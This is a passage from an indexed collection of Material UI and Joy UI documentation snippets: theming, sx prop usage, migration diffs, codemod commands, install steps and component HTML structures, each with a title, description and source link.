class=\"MuiCircularProgress-track\"></circle>\n    <circle class=\"MuiCircularProgress-progress\"></circle>\n  </svg>\n  <!-- children are nested here when present -->\n</span>\n```\n\n----------------------------------------\n\nTITLE: Minimal JSX Example for Tabbed Display (JSX)\nDESCRIPTION: This snippet shows a simple `<div>Hello</div>` structure in JSX. It's intended as example code within the 'JS' tab of a `@mui/docs/HighlightedCodeWithTabs` component configuration, demonstrating how to embed code snippets within component props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/codeblock.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<div>Hello</div>\n```\n\n----------------------------------------\n\nTITLE: Array-based Theme Spacing in Material-UI\nDESCRIPTION: Shows spacing transformation when theme spacing is configured as an array. The prop value is used as array index to determine the margin value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = {\n  spacing: [0, 2, 3, 5, 8],\n}\n\n<Box sx={{ m: -2 }} /> // margin: -3px;\n<Box sx={{ m: 0 }} /> // margin: 0px;\n<Box sx={{ m: 2 }} /> // margin: 3px;\n```\n\n----------------------------------------\n\nTITLE: Running Material UI Next.js Project\nDESCRIPTION: Commands to install dependencies and start the development server for the Material UI Next.js project.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-nextjs-pages-router/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: System Props Migration Example\nDESCRIPTION: Code diff showing how to migrate from deprecated system props to the sx prop for styling grid components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_10\n\nLANGUAGE: jsx\nCODE:\n```\n- <Grid mt={2} />\n+ <Grid sx={{ mt: 2 }} />\n```\n\n----------------------------------------\n\nTITLE: Installing and Running Material UI Vite Project\nDESCRIPTION: Commands to install project dependencies and start the development server using npm.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-vite-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Comparing Flat Prop vs sx Prop for Typography Color in MUI (JSX)\nDESCRIPTION: Illustrates the equivalence between using a dedicated flat prop (`color`) and the `sx` prop for styling the color of a `Typography` component in MUI. Both examples achieve the same result of setting the text color using a theme palette value ('grey.600').\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Typography color=\"grey.600\">\n\n// is equivalent to\n<Typography sx={{ color: 'grey.600' }}>\n```\n\n----------------------------------------\n\nTITLE: Adding Accessibility Role to Decorative Dividers\nDESCRIPTION: Shows how to properly set accessibility attributes when using the Divider component for decorative purposes. This ensures screen readers can correctly interpret the content.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/divider/divider.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n<Divider component=\"div\" role=\"presentation\">\n  {/* any elements nested inside the role=\"presentation\" preserve their semantics. */}\n</Divider>\n```\n\n----------------------------------------\n\nTITLE: Package Dependency Update for Preview Builds\nDESCRIPTION: Example of updating package.json to use a preview build from CodeSandbox CI instead of the released version.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\ndiff --git a//package.json b//package.json\nindex 791a7da1f4..a5db13b414 100644\n--- a/package.json\n+++ b/package.json\n@@ -61,7 +61,7 @@\n   \"dependencies\": {\n     \"@babel/runtime\": \"^7.4.4\",\n     \"@mui/styled-engine\": \"^5.0.0-alpha.16\",\n-    \"@mui/material\": \"^5.0.0-alpha.15\",\n+    \"@mui/material\": \"https://pkg.csb.dev/mui/material-ui/commit/371c952b/@mui/material\",\n     \"@mui/system\": \"^5.0.0-alpha.16\",\n```\n\n----------------------------------------\n\nTITLE: Updating TextareaAutosize props in React\nDESCRIPTION: Replaces rows with minRows, renames rowsMax to maxRows, and renames rowsMin to minRows in TextareaAutosize component for consistency with HTML attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_42\n\nLANGUAGE: diff\nCODE:\n```\n-<TextareaAutosize rows={2} />\n+<TextareaAutosize minRows={2} />\n\n-<TextareaAutosize rowsMax={6}>\n+<TextareaAutosize maxRows={6}>\n\n-<TextareaAutosize rowsMin={1}>\n+<TextareaAutosize minRows={1}>\n```\n\n----------------------------------------\n\nTITLE: Updating material-ui to @material-ui/core imports\nDESCRIPTION: Manual migration step needed when moving from pre-v1.0 to v1.0, changing import paths from 'material-ui' to '@material-ui/core'.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_122\n\nLANGUAGE: diff\nCODE:\n```\n-import Typography from 'material-ui/Typography';\n+import Typography from '@material-ui/core/Typography';\n```\n\n----------------------------------------\n\nTITLE: Running Material-UI Types Codemod Command\nDESCRIPTION: Command to execute the material-ui-types codemod on a specified path. This renames Omit imports from @material-ui/types to DistributiveOmit.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_96\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/material-ui-types <path>\n```\n\n----------------------------------------\n\nTITLE: Styling Deeper Elements with Plain CSS\nDESCRIPTION: Demonstrates how to target and style nested child elements within Material UI components, specifically styling the Slider's thumb with custom border-radius.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_3\n\nLANGUAGE: CSS\nCODE:\n```\n.slider {\n  color: #20b2aa;\n}\n\n.slider:hover {\n  color: #2e8b57;\n}\n\n.slider .MuiSlider-thumb {\n  border-radius: 1px;\n}\n```\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport './PlainCssSliderDeep1.css';\n\nexport default function PlainCssSliderDeep1() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider defaultValue={30} className=\"slider\" />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Updating ServerStyleSheets Import Path\nDESCRIPTION: Diff showing the updated import path for ServerStyleSheets, which was moved from @mui/material/styles to @mui/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_30\n\nLANGUAGE: diff\nCODE:\n```\n-import { ServerStyleSheets } from '@mui/material/styles';\n+import { ServerStyleSheets } from '@mui/styles';\n```\n\n----------------------------------------\n\nTITLE: Customizing Icon Base Class Name\nDESCRIPTION: JavaScript code to customize the default base class name for icons using the Material UI theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiIcon: {\n      defaultProps: {\n        // Replace the `material-icons` default value.\n        baseClassName: 'material-icons-two-tone',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Handling Dialog Actions with Toolpad API in React\nDESCRIPTION: Example of using the useDialogs hook from @toolpad/core to handle dialog actions like prompts, confirmations, and custom dialogs.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dialogs/dialogs.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\nconst handleDelete = async () => {\n  const id = await dialogs.prompt('Enter the ID to delete', {\n    okText: 'Delete',\n    cancelText: 'Cancel',\n  });\n\n  if (id) {\n    const deleteConfirmed = await dialogs.confirm(\n      `Are you sure you want to delete \"${id}\"?`,\n    );\n    if (deleteConfirmed) {\n      try {\n        setIsDeleting(true);\n        await mockApiDelete(id);\n        dialogs.alert('Deleted!');\n      } catch (error) {\n        const message = error instanceof Error ? error.message : 'Unknown error';\n        await dialogs.open(MyCustomDialog, { id, error: message });\n      } finally {\n        setIsDeleting(false);\n      }\n    }\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: Importing Link Component for Breadcrumbs in React (Joy UI)\nDESCRIPTION: Import statement for the Link component that is commonly used with Breadcrumbs to create clickable navigation items.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport Link from '@mui/joy/Link';\n```\n\n----------------------------------------\n\nTITLE: Installing Pigment CSS with Next.js\nDESCRIPTION: Commands to install Pigment CSS and its Next.js plugin dependencies.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @pigment-css/react\nnpm install --save-dev @pigment-css/nextjs-plugin\n```\n\n----------------------------------------\n\nTITLE: Using prefers-color-scheme with CSS Variables and Color Schemes (JSX & CSS)\nDESCRIPTION: This snippet shows the theme setup (JSX) enabling both `cssVariables` and `colorSchemes`. The corresponding CSS output demonstrates how Material UI v6 automatically uses the `prefers-color-scheme: dark` media query to apply dark mode styles by default when these features are enabled, defining CSS variables within the media query block.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v6-is-out.md#2025-04-22_snippet_5\n\nLANGUAGE: js JSX\nCODE:\n```\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\n\nconst theme = createTheme({\n  cssVariables: true,\n  colorSchemes: { dark: true },\n});\n\nfunction App() {\n  return <ThemeProvider theme={theme}>...</ThemeProvider>;\n}\n```\n\nLANGUAGE: css CSS\nCODE:\n```\n:root {\n  --mui-palette-primary-main: #1976d2;\n  --mui-palette-background-default: #fff;\n  ...\n}\n\n@media (prefers-color-scheme: dark) {\n  :root {\n    --mui-palette-primary-main: #90caf9;\n    --mui-palette-background-default: #121212;\n    ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Table Theme in Joy UI\nDESCRIPTION: This snippet demonstrates how to customize the Table theme based on the borderAxis prop using the extendTheme() function in Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/table/table.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  components: {\n    JoyTable: {\n      styleOverrides: {\n        root: ({ ownerState }) => ({\n          ...(ownerState.borderAxis === 'header' && {\n            // this example applies borders between <thead> and <tbody>\n            '& thead th:not([colspan])': {\n              borderBottom: '2px solid var(--TableCell-borderColor)',\n            },\n          }),\n        });\n      }\n    }\n  }\n})\n\n<CssVarsProvider theme={theme}>…</CssVarsProvider>\n```\n\n----------------------------------------\n\nTITLE: Importing Typography Component for Breadcrumbs in React (Joy UI)\nDESCRIPTION: Import statement for the Typography component used with Breadcrumbs to display text elements, often used for the current page indicator.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport Typography from '@mui/joy/Typography';\n```\n\n----------------------------------------\n\nTITLE: Adding Responsive Viewport Meta Tag in HTML\nDESCRIPTION: This HTML snippet shows how to add a responsive viewport meta tag to ensure proper rendering and touch zooming for all devices when using Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/usage/usage.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"viewport\" content=\"initial-scale=1, width=device-width\" />\n```\n\n----------------------------------------\n\nTITLE: Configuring Editable Data Source in MUI Data Grid (JavaScript)\nDESCRIPTION: Demonstrates how to set up a custom Data Source for the MUI Data Grid with server-side row editing capability. Requires the grid component from the MUI X library (typically in a React context), and expects the developer to implement their own asynchronous logic for `getRows` and `updateRow`. The function signatures for `getRows` and `updateRow` must return Promises, with `updateRow` returning a Promise that resolves on successful update, triggering cache invalidation; errors are routed to the `onDataSourceError` callback with parameter information. The key parameters are `params` for both methods, representing fetch/update details for a row. Use this when custom server communication and failure handling are needed.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v8.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst dataSource: GridDataSource = {\n  getRows: async (params: GridGetRowsParams) => {\n    // Fetch rows from the server\n  },\n  updateRow: async (params: GridUpdateRowParams) => {\n    // Update row on the server\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Theme zIndex with sx Prop in Material UI JSX\nDESCRIPTION: Shows how to set the `zIndex` using a key from the `theme.zIndex` object (e.g., 'tooltip') within the `sx` prop. This allows using predefined z-index levels from the theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ zIndex: 'tooltip' }} />\n// equivalent to zIndex: theme => theme.zIndex.tooltip\n```\n\n----------------------------------------\n\nTITLE: Material UI Peer Dependencies Configuration\nDESCRIPTION: JSON configuration showing React and React-DOM peer dependency requirements for Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n\"peerDependencies\": {\n  \"react\": \"^17.0.0 || ^18.0.0 || ^19.0.0\",\n  \"react-dom\": \"^17.0.0 || ^18.0.0 || ^19.0.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Next.js Pages Router Document Configuration\nDESCRIPTION: Configuration for enabling CSS layer feature in Next.js Pages Router using custom document setup with Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/tailwindcss/tailwindcss-v4.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\nimport {\n  createCache,\n  documentGetInitialProps,\n} from '@mui/material-nextjs/v15-pagesRouter';\n\n// ...\n\nMyDocument.getInitialProps = async (ctx: DocumentContext) => {\n  const finalProps = await documentGetInitialProps(ctx, {\n    emotionCache: createCache({ enableCssLayer: true }),\n  });\n  return finalProps;\n};\n```\n\n----------------------------------------\n\nTITLE: Applying Color Inversion to Custom Component with sx Prop in React\nDESCRIPTION: Demonstrates how to use the applySolidInversion utility with the sx prop to add color inversion to a custom Box component. This allows color inversion to be applied to components not natively supported by Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/color-inversion/color-inversion.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={[{ ...baseStyles }, applySolidInversion('neutral')]}>...</Box>\n```\n\n----------------------------------------\n\nTITLE: SSR Flickering Prevention Example\nDESCRIPTION: Code demonstration showing how to prevent SSR flickering by using theme.applyStyles instead of direct mode comparison.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/css-theme-variables/configuration.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n-      sx={(theme) => ({\n-        backgroundColor: theme.palette.mode === 'dark' ? '#000' : '#fff',\n-        '&:hover': {\n-          backgroundColor: theme.palette.mode === 'dark' ? '#333' : '#f5f5f5',\n-        },\n-      })}\n+      sx={[\n+        {\n+          backgroundColor: '#fff',\n+          '&:hover': {\n+            backgroundColor: '#f5f5f5',\n+          },\n+        },\n+        (theme) =>\n+          theme.applyStyles('dark', {\n+            backgroundColor: '#000',\n+            '&:hover': {\n+              backgroundColor: '#333',\n+            },\n+          }),\n+      ]}\n```\n\n----------------------------------------\n\nTITLE: Updating Container Import Path\nDESCRIPTION: Diff showing the updated import path for the Container component which moved from lab to core package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n-import Container from '@material-ui/lab/Container';\n+import Container from '@material-ui/core/Container';\n```\n\n----------------------------------------\n\nTITLE: Renaming Fade to Alpha in React Styles\nDESCRIPTION: Renames the 'fade' style utility import and calls to 'alpha()'. This codemod updates the color manipulation utility to use the new naming convention in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_84\n\nLANGUAGE: diff\nCODE:\n```\n-import { fade, lighten } from '@material-ui/core/styles';\n+import { alpha, lighten } from '@material-ui/core/styles';\n\n-const foo = fade('#aaa');\n+const foo = alpha('#aaa');\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/fade-rename-alpha <path>\n```\n\n----------------------------------------\n\nTITLE: Using Responsive Spacing Values in Grid Components with React\nDESCRIPTION: Shows how to implement responsive spacing in Grid containers by using an object with breakpoint keys that define different spacing values for different screen sizes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\n<Grid container spacing={{ xs: 2, md: 3 }} />\n```\n\n----------------------------------------\n\nTITLE: Skeleton Variant Codemod Example\nDESCRIPTION: This codemod renames Skeleton component variant values to match the updated API in Material-UI v5, changing 'circle' to 'circular' and 'rect' to 'rectangular'.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_107\n\nLANGUAGE: diff\nCODE:\n```\n-<Skeleton variant=\"circle\" />\n-<Skeleton variant=\"rect\" />\n+<Skeleton variant=\"circular\" />\n+<Skeleton variant=\"rectangular\" />\n```\n\n----------------------------------------\n\nTITLE: Spacing System Import in Material-UI\nDESCRIPTION: Shows how to import the spacing utility from the MUI system package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/spacing/spacing.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\nimport { spacing } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Extending Theme with Primary Color Palette in JavaScript\nDESCRIPTION: This JavaScript snippet defines a `primary` object containing color shades (50, 100, 200). It then utilizes the `extendTheme` function (presumably from a UI library like Joy UI/MUI) to customize the light color scheme's palette. It assigns the defined `primary` colors and configures related properties for plain components (`plainColor`, `plainHoverBg`, `plainActiveBg`, `plainDisabledColor`) using CSS variables derived from the theme's palette.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/markdown.md#2025-04-22_snippet_0\n\nLANGUAGE: js\nCODE:\n```\nconst primary = {\n  50: '#F4FAFF',\n  100: '#DDF1FF',\n  200: '#ADDBFF',\n};\n\nextendTheme({\n  colorSchemes: {\n    light: {\n      palette: {\n        primary: {\n          ...primary,\n          plainColor: `var(--joy-palette-primary-600)`,\n          plainHoverBg: `var(--joy-palette-primary-100)`,\n          plainActiveBg: `var(--joy-palette-primary-200)`,\n          plainDisabledColor: `var(--joy-palette-primary-200)`,\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Stack HTML Structure\nDESCRIPTION: Basic HTML structure of the Stack component showing the root element.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/stack/stack.md#2025-04-22_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiStack-root\">\n  <!-- Stack contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Importing Stack Component in React\nDESCRIPTION: Basic import statement for the Stack component from Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/stack/stack.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Stack from '@mui/material/Stack';\n```\n\n----------------------------------------\n\nTITLE: Forcing Theme Re-rendering with ThemeProvider\nDESCRIPTION: Shows how to opt out of the default theme behavior by using the forceThemeRerender prop on the ThemeProvider component, which will cause the theme to re-render when the mode changes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\n<ThemeProvider forceThemeRerender />\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Augmentation for Custom Colors in Joy UI\nDESCRIPTION: Shows how to add type safety for custom color values using TypeScript module augmentation, enabling proper type checking with custom colors.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_7\n\nLANGUAGE: typescript\nCODE:\n```\n// This part could be declared in your theme file\ndeclare module '@mui/joy/Button' {\n  interface ButtonPropsColorOverrides {\n    secondary: true;\n    tertiary: true;\n  }\n}\n\n// typed-safe\n<Button color=\"secondary\" />\n<Button color=\"tertiary\" />\n```\n\n----------------------------------------\n\nTITLE: Installing Local Package Build\nDESCRIPTION: Command to install a locally built MUI package for testing.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$test-project> npm i ./path-to-file/mui-material-x.x.x.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Installing Project Dependencies\nDESCRIPTION: Command to install project dependencies using pnpm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/CONTRIBUTING.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npnpm install\n```\n\n----------------------------------------\n\nTITLE: Moved Lab Modules Codemod Named Import Example\nDESCRIPTION: Another example of the moved-lab-modules codemod showing how it handles named imports for components moved from @material-ui/lab to @material-ui/core.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_100\n\nLANGUAGE: diff\nCODE:\n```\n-import { SpeedDial } from '@material-ui/lab';\n+import { SpeedDial } from '@material-ui/core';\n```\n\n----------------------------------------\n\nTITLE: Updating CircularProgress Variant Prop in React\nDESCRIPTION: Renames the CircularProgress 'static' variant to 'determinate'. This codemod updates the CircularProgress component to use the new variant naming in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_74\n\nLANGUAGE: diff\nCODE:\n```\n-<CircularProgress variant=\"static\" classes={{ static: 'className' }} />\n+<CircularProgress variant=\"determinate\" classes={{ determinate: 'className' }} />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/circularprogress-variant <path>\n```\n\n----------------------------------------\n\nTITLE: Defining Description Paragraph using HTML\nDESCRIPTION: This HTML snippet uses a paragraph tag (`<p>`) assigned the CSS class `description`. Its purpose is to display the main introductory sentence describing the Developer Advocate role, likely styled distinctly based on the 'description' class within the webpage's CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/careers/developer-advocate.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<p class=\"description\">You will strategize and implement educational initiatives from end to end to help developers build better UIs, faster.</p>\n```\n\n----------------------------------------\n\nTITLE: Updating Color Import Paths\nDESCRIPTION: Diff showing the change in import path for colors from nested imports to top-level imports.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n-import red from '@mui/material/colors/red';\n+import { red } from '@mui/material/colors';\n```\n\n----------------------------------------\n\nTITLE: Updating makeStyles Import and Usage\nDESCRIPTION: Diff showing the changes to import makeStyles from @mui/styles instead of @mui/material/styles and adding ThemeProvider for theme context.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_29\n\nLANGUAGE: diff\nCODE:\n```\n-import { makeStyles } from '@mui/material/styles';\n+import { makeStyles } from '@mui/styles';\n+import { createTheme, ThemeProvider } from '@mui/material/styles';\n\n+const theme = createTheme();\n  const useStyles = makeStyles((theme) => ({\n    background: theme.palette.primary.main,\n  }));\n  function Component() {\n    const classes = useStyles();\n    return <div className={classes.root} />\n  }\n\n  // In the root of your app\n  function App(props) {\n-  return <Component />;\n+  return <ThemeProvider theme={theme}><Component {...props} /></ThemeProvider>;\n  }\n```\n\n----------------------------------------\n\nTITLE: Component Structure - HTML\nDESCRIPTION: The HTML structure of the AspectRatio component showing the root and content elements with their respective classes and attributes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/aspect-ratio/aspect-ratio.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiAspectRatio-root\">\n  <div class=\"MuiAspectRatio-content\">\n    <some-element data-first-child>\n      <!-- Aspect Ratio contents -->\n    </some-element>\n  </div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Importing Inter Font in React\nDESCRIPTION: Code snippet showing how to import the Inter font from Fontsource in a React application entry point.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/installation/installation.md#2025-04-22_snippet_3\n\nLANGUAGE: tsx\nCODE:\n```\nimport '@fontsource/inter';\n```\n\n----------------------------------------\n\nTITLE: Importing AvatarGroup Component in Joy UI\nDESCRIPTION: Import statement for the AvatarGroup component, which is used to group multiple Avatars together.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/avatar/avatar.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport AvatarGroup from '@mui/joy/AvatarGroup';\n```\n\n----------------------------------------\n\nTITLE: Renaming Theme Creation Function in React\nDESCRIPTION: Renames the function 'createMuiTheme()' to 'createTheme()'. This codemod updates the theme creation function to use the new naming convention in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_78\n\nLANGUAGE: diff\nCODE:\n```\n-import { createMuiTheme } from '@material-ui/core/styles';\n+import { createTheme } from '@material-ui/core/styles';\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/create-theme <path>\n```\n\n----------------------------------------\n\nTITLE: Resulting CSS from Theme Spacing - CSS\nDESCRIPTION: Displays the CSS output resulting from applying marginBottom via the MUI sx prop or Box prop, mapped using the theme.spacing helper (with a default of 8px spacing). No direct dependencies, illustrates the result in a CSS class after processing by MUI's styling system. The variable X is replaced by the computed pixel value (e.g., 24px).\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/properties/properties.md#2025-04-22_snippet_3\n\nLANGUAGE: CSS\nCODE:\n```\n.my-class {\n  margin-bottom: Xpx;\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Position Utilities from MUI System\nDESCRIPTION: Shows how to import the positions utility from the MUI System package. This import provides access to various position-related props and CSS properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/positions/positions.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { positions } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Removing disableEqualOverflow Prop\nDESCRIPTION: Removal of the deprecated disableEqualOverflow prop from Grid component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/migrating-to-v6/migrating-to-v6.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid disableEqualOverflow>\n+<Grid>\n```\n\n----------------------------------------\n\nTITLE: Using Callback Function for Theme Access in sx Prop (Material UI JSX)\nDESCRIPTION: Demonstrates using a callback function as the value for the `sx` prop. The callback receives the theme object as an argument, allowing access to theme values (like `theme.typography` or `theme.palette`) to compute dynamic styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_15\n\nLANGUAGE: jsx\nCODE:\n```\n<Box\n  sx={(theme) => ({\n    ...theme.typography.body,\n    color: theme.palette.primary.main,\n  })}\n/>\n```\n\n----------------------------------------\n\nTITLE: Button Component HTML Structure\nDESCRIPTION: The basic HTML structure of the Button component, showing its DOM representation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button/button.md#2025-04-22_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<button class=\"MuiButton-root\" type=\"button\">\n  <!-- Button contents -->\n</button>\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI v4 and React 17 with npm\nDESCRIPTION: Command to install Material UI v4.11.2 and React 17 as prerequisites for the migration process. This ensures compatibility before proceeding with the v5 upgrade.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @material-ui/core@^4.11.2 react@^17.0.0\n```\n\n----------------------------------------\n\nTITLE: Implementing Numbered Lists with Decimal Markers\nDESCRIPTION: Shows how to create a numbered list using the component and marker props together to achieve a decimal-style ordered list.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n<List component=\"ol\" marker=\"decimal\">\n```\n\n----------------------------------------\n\nTITLE: Joy UI Starting Links Collection Component\nDESCRIPTION: A component that renders a collection of useful links to help users get started with Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/overview/overview.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n{\"component\": \"modules/components/JoyStartingLinksCollection.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating Color Conversion Function Import\nDESCRIPTION: Diff showing the rename of convertHexToRGB to hexToRgb and updated import path in the color manipulator module.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_5\n\nLANGUAGE: 